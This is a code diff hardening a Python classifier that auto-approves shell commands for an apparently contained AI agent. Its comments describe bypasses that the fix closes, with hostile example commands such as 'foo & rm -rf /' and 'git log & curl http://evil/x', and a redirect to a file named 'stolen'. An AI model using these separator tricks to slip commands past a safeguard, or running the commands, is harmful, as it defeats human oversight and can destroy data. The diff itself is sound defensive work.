@@ -352,7 +352,13 @@ def _split_compound_command(command: str) -> list[str]:
                 quote_state = ch
                 i += 1
                 continue
-            if ch in (";", "\n"):
+            if ch in (";", "\n", "\r"):
+                # `\r` treated as `\n`: some pipelines (Windows-authored payloads,
+                # copy-pasted heredocs) carry CR terminators. Bash on Unix ignores
+                # bare `\r` between tokens, but the classifier fails-closed here —
+                # splitting on `\r` prevents an obfuscation vector where a
+                # payload uses CR to hide a second statement from a `\n`-only
+                # splitter (coherence refute cpp#103 2026-08-06).
                 segments.append(command[seg_start:i].strip())
                 i += 1
                 seg_start = i
@@ -360,6 +366,25 @@ def _split_compound_command(command: str) -> list[str]:
             if ch == "&" and i + 1 < n and command[i + 1] == "&":
                 segments.append(command[seg_start:i].strip())
                 i += 2
+                seg_start = i
+                continue
+            if ch == "&":
+                # Single `&` = background operator (statement separator). Bash
+                # runs the LHS in the background and continues with the next
+                # statement — same semantic as `;` for classifier purposes.
+                # BUT: `&` also appears in fd-redirect syntax `2>&1` / `>&2`.
+                # Preceded by `>` → part of a redirect, NOT a separator.
+                # Preceded by `<` → part of process-substitution `<(...)` /
+                # `<&N` — also not a separator. Fix cpp#103 (coherence refute
+                # 2026-08-06): previously single `&` fell through to `i += 1`
+                # and `foo & rm -rf /` never split, so the rm sub scattered
+                # outside the deny check.
+                prev = command[i - 1] if i > 0 else ""
+                if prev in (">", "<"):
+                    i += 1
+                    continue
+                segments.append(command[seg_start:i].strip())
+                i += 1
                 seg_start = i
                 continue
             if ch == "|":
@@ -800,8 +825,13 @@ _SAFE_ECHO_LITERAL_RE = re.compile(r"^\s*echo\s+[A-Za-z0-9_.,:/=+-]+\s*$")
 
 # Bounded pipe tools: head/tail with numeric arg only, wc with flag-only,
 # cat with single filename arg, mktemp with only -d (no --tmpdir=<path>).
-_SAFE_HEAD_TAIL_RE = re.compile(r"^\s*(?:head|tail)(?:\s+-[cn]\s*\d+|\s+-\d+)?(?:\s+\S+)?\s*$")
-_SAFE_WC_RE = re.compile(r"^\s*wc(?:\s+-[lcwLm]+)?(?:\s+\S+)?\s*$")
+# File args restricted to same charset as cat — prevents `head -30 >stolen`
+# where `>stolen` was accepted as a file arg by loose `\S+` (coherence
+# refute 2026-08-06 mineur).
+_SAFE_HEAD_TAIL_RE = re.compile(
+    r"^\s*(?:head|tail)(?:\s+-[cn]\s*\d+|\s+-\d+)?(?:\s+[A-Za-z0-9_./-]+)?\s*$"
+)
+_SAFE_WC_RE = re.compile(r"^\s*wc(?:\s+-[lcwLm]+)?(?:\s+[A-Za-z0-9_./-]+)?\s*$")
 _SAFE_CAT_RE = re.compile(r"^\s*cat\s+[A-Za-z0-9_./-]+\s*$")
 _SAFE_MKTEMP_RE = re.compile(r"^\s*mktemp(?:\s+-d)?\s*$")
 
@@ -887,8 +917,12 @@ def _is_safe_git_readonly_sub(sub: str) -> bool:
     if git_sub not in SAFE_GIT_READONLY_SUBCOMMANDS:
         return False
 
-    # Redirect chars deny (except 2>/dev/null which is stripped by caller)
-    if re.search(r"(?<![0-9])>|<[^<]", sub) or ">>" in sub or "<(" in sub or ">(" in sub:
+    # Redirect chars deny — any `>`/`>>`/`<`/`<(`/`>(` remaining after the
+    # caller stripped `[0-9]*>/dev/null` denies. Previously excluded
+    # fd-numeric prefix via `(?<![0-9])>` — but that let `1>/tmp/evil` and
+    # `2>/tmp/x` (non-devnull stderr redirect) through (coherence mineur).
+    # Now: any `>`/`<` char in the sub (post-devnull-strip) → deny.
+    if ">" in sub or "<" in sub:
         return False
 
     # Tokenize on whitespace; check each token against deny sets.
@@ -911,17 +945,31 @@ def _is_safe_git_readonly_sub(sub: str) -> bool:
     return True
 
 
-# Compound split respecting `&&`, `||`, `;`, `|` (all allowed as internal
-# glue in the read-only compound). `2>/dev/null` is a per-sub token that
-# needs to survive the split — it's stderr-suppression, not a compound
-# operator. We handle it by stripping it from each sub before predicate
-# matching. Compound stderr redirects to any other target → deny.
-_STDERR_DEVNULL_RE = re.compile(r"\s+2>/dev/null(?=\s|$)")
+# Compound split respecting `&&`, `||`, `;`, `|`, `&` (background), and
+# `\n`/`\r` (statement separators — bash treats each line as an independent
+# command). All are legitimate separators bash executes each side of. Missing
+# `&` and newline (coherence-flagged 2026-08-06 refute) allowed a bypass:
+# `git log & curl http://evil/x` tokenized across `&` in `sub.split()` and
+# the `curl` sub scattered outside the deny check → auto-approved. Fix
+# closes the gap so each sub re-validates independently.
+#
+# `[0-9]*>/dev/null` (fd-numeric stderr suppression) is stripped from each
+# sub BEFORE predicate matching. Strip is anchored to end-of-token to prevent
+# suffix escape (`2>/dev/null/../etc/x` no longer strips at the `null` bound-
+# ary). Any other `>`/`>>`/`<` remaining after strip → sub fails closed.
+_STDERR_DEVNULL_RE = re.compile(r"\s+[0-9]*>/dev/null(?=\s|$)")
 
 
 def _split_git_readonly_compound(command: str) -> list[str]:
-    """Split on `&&`/`||`/`;`/`|` and strip `2>/dev/null` from each sub."""
-    parts = re.split(r"\s*(?:&&|\|\||;|\|)\s*", command)
+    """Split on `&&`/`||`/`;`/`|`/`&`/newline and strip `[0-9]*>/dev/null`.
+
+    Every bash statement separator handled — the compound whitelist must
+    validate EACH resulting sub, not the glue itself. `&` (background) and
+    `\\n`/`\\r` (line breaks) previously slipped through, allowing
+    `git log & curl evil` to auto-approve (coherence refute 2026-08-06).
+    """
+    # Newlines and background-`&` are statement terminators; treat as `;`.
+    parts = re.split(r"\s*(?:&&|\|\||;|\||&|\n|\r)\s*", command)
     return [_STDERR_DEVNULL_RE.sub("", p).strip() for p in parts if p.strip()]
 
 
@@ -931,19 +979,28 @@ def is_git_readonly_compound_when_contained(command: str) -> bool:
     Returns True IFF:
       1. `MIKA_PILOT_CONTAINED=1` — attestation gate (structurally inforgeable
          per (a)/(b) audit above)
-      2. Every sub-command (split on `&&`/`||`/`;`/`|`, stripping `2>/dev/null`)
-         matches ONE of:
+      2. `contains_unquoted_metacharacter(command)` is False — blocks
+         `$(...)`/backtick in double-quoted arg strings (cpp#41 semantics).
+      3. `is_tier3_dangerous(command)` is False — defense-in-depth call at
+         predicate scope so tier3 patterns (find -exec, sudo, curl, rm -rf,
+         `>` redirect, etc.) still fail closed even when a sub matches the
+         whitelist. Previous code path returned True BEFORE the standard
+         `is_tier3_dangerous` call in `is_safe_bash_command` — coherence
+         refute 2026-08-06 closed this gap.
+      4. Every sub-command (split on `&&`/`||`/`;`/`|`/`&`/newline, stripping
+         `[0-9]*>/dev/null`) matches ONE of:
            * `git <SAFE_GIT_READONLY_SUBCOMMAND> [flags]` per
              `_is_safe_git_readonly_sub` (flag deny-list applied)
            * `sed 's<SEP>PATTERN<SEP>REPLACE<SEP>[gp]*'` pure substitution
            * `echo "literal"` or bare literal (no `$`/backtick)
            * `head|tail|wc|cat|mktemp` in bounded shape
-      3. No dangerous shape survives — `is_tier3_dangerous` still checked
-         upstream via the caller, and any unrecognized sub fails closed.
+      5. Any unrecognized sub fails closed.
 
     Wired into `is_safe_bash_command` BEFORE the metachar guard so that
     `&&`, `|`, and `2>/dev/null` in these legitimate compounds don't trip
-    the standard-deny path.
+    the standard-deny path. Guards 2 and 3 are called explicitly here to
+    preserve their semantic (they run downstream in `is_safe_bash_command`
+    but this predicate's `return True` short-circuits them).
     """
     if not _is_pilot_contained():
         return False
@@ -957,6 +1014,14 @@ def is_git_readonly_compound_when_contained(command: str) -> bool:
     # in argument strings. `contains_unquoted_metacharacter` correctly flags
     # `$(`/backtick/`$'` in both unquoted and double-quoted regions.
     if contains_unquoted_metacharacter(command):
+        return False
+
+    # Defense-in-depth: `is_tier3_dangerous` is normally called downstream in
+    # `is_safe_bash_command` — but this predicate short-circuits with `return
+    # True` BEFORE the tier3 call. Call it explicitly here so tier3 patterns
+    # (find -exec, sudo, curl, rm -rf, `>` redirect, etc.) still fail closed
+    # even if a sub happens to match the whitelist (coherence refute 2026-08-06).
+    if is_tier3_dangerous(command):
         return False
 
     subs = _split_git_readonly_compound(command)
